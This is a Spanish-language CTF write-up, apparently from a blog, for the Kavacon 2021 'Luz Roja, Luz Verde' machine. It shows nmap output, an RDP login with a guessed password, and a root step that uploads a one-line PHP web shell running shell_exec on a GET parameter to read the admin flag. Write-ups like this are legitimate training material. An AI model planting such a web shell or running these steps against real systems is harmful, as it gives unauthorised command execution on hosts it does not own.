---
title: "Kavacon 2021 – Luz Roja, Luz Verde"
author: "Oscar Bravo"
header: 
  teaser: "/assets/images/post/2021/kavacon.png"
categories:
  - WriteUp
tags:
  - Kavacon
  - Maquina
---


## USER

En primer llugar hacemos un nmap a la ip y obtenemos lo siguiente

```
 Nmap 7.91 scan initiated Wed Oct 20 11:01:58 2021 as: nmap -p22,80,135,139,443,445,3389,5040,49664,49665,49666,49667,49669,49674 -sCV -O -oN NMAP 10.4.4.153

Nmap scan report for 10.4.4.153
Host is up (0.068s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1b:96:83:6a:eb:95:f2:4e:a6:5c:7b:03:9f:11:ff:69 (RSA)
|   256 49:b1:af:d5:ab:62:68:18:17:dd:91:7d:d1:cf:24:68 (ECDSA)
|_  256 a3:28:50:54:b9:fa:f5:58:a7:20:3d:ba:08:e2:71:23 (ED25519)
80/tcp    open  http          Apache httpd 2.4.51 ((Win64) OpenSSL/1.1.1l PHP/7.3.31)
|_http-server-header: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.3.31
| http-title: Login super seguro
|_Requested resource was http://10.4.4.153/dashboard/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.51 ((Win64) OpenSSL/1.1.1l PHP/7.3.31)
|_http-server-header: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.3.31
| http-title: Login super seguro
|_Requested resource was https://10.4.4.153/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 (91%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows XP SP3 (88%), Microsoft Windows Server 2008 SP1 (88%), Microsoft Windows 10 (87%), Microsoft Windows 7 or Windows Server 2008 R2 (87%), Microsoft Windows Server 2008 R2 (87%), Microsoft Windows Server 2008 R2 or Windows 8.1 (87%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (87%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-20T14:04:40
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 20 11:06:56 2021 -- 1 IP address (1 host up) scanned in 298.22 seconds
```

Al entrar a la web nos damos cuenta que es sobre «Juego del Calamar»

![Luz Roja, Luz Verde 1](/assets/images/post/2021/luzrojaluzverde_1.png)

De acuerdo a la serio uno se movía con Luz verde, por lo que escribimos «verde», con esto entramos a una web con los datos de nuestro jugador #3389 y podemos descargar la ficha, el jugador 3389 hace alusión al puerto 3389 visto en en nmap además de un potencial usuario «seong»

![Luz Roja, Luz Verde 2](/assets/images/post/2021/luzrojaluzverde_2.png) | ![Luz Roja, Luz Verde 3](/assets/images/post/2021/luzrojaluzverde_3.png)

Al tarducir el fichero nos dice que la contraseña es un numero de 4 digitos. En la serie, la contraseña de ATM era el numero del jugador por lo que se deduce que la contraseña es 3389 (mismo que el pueto RDP), se prueba y podemos entrar a remote desktop con el comando y obtenemos acceso con rdp y la flag

rdesktop -f -u "seong" -p 3389 <IP>

***flag{jug4r3m0smu3vet3luzv3rd3!!}***

## ROOT

Para root, se debe subir una web shell en php en la carpeta C:\xampp\htdocs\dashboard\ desde

```
<?php
    echo shell_exec($_GET['cmd']);
?>
```

Con esta web tenemos acceso como administrador y podremos ver la flag revisando en nuestra web con la extensión ?cmd=type C:\Users\admin\Desktop\admin.txt.txt

***flag{c0m0estamosmentalmente?}***

![Racso](https://www.hackthebox.com/badge/image/159593)